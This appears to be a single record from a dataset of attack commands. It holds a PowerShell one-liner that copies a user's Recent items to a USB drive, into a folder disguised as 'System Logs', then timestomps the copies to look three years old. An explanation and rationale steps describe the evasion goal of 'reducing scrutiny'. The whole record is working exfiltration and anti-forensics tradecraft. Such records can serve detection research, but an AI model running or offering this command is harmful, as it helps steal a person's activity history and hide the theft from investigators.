command: $usb=((Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2" | Select -First 1 -ExpandProperty DeviceID)+'\'); $dst=Join-Path $usb 'System Logs'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; Copy-Item "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Recent\*" -Destination $dst -Force -ErrorAction SilentlyContinue; Get-ChildItem $dst -Recurse | ForEach-Object { $_.CreationTime=(Get-Date).AddYears(-3); $_.LastWriteTime=$_.CreationTime }
explanation: Copies Recent items to a benign-looking folder on USB using Copy-Item and then timestomps them to appear old, reducing scrutiny.
rationale_steps: Copy recent file references via Copy-Item
Adjust timestamps to blend with older data
